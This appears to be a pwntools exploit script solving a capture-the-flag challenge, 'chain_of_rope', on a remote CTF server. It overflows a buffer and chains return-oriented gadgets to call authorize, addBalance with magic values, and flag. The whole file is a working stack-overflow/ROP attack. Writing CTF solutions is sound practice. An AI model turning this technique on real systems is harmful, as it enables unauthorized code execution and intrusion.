from pwn import *
r=remote('shell.actf.co',19400)
#r=process("./chain_of_rope")

b=ELF('./chain_of_rope')

context.log_level='debug'
psrr=0x0000000000401401
pdr=0x0000000000401403
pay=""
pay+='x'*0x38
pay+=p64(b.symbols['authorize'])
pay+=p64(pdr)
pay+=p64(0xdeadbeef)
pay+=p64(b.symbols['addBalance'])
pay+=p64(pdr)
pay+=p64(0xba5eba11)
pay+=p64(psrr)
pay+=p64(0xbedabb1e)
pay+=p64(0xffffffff)
pay+=p64(b.symbols['flag'])

r.sendline('1')
r.sendline(pay)

r.interactive()
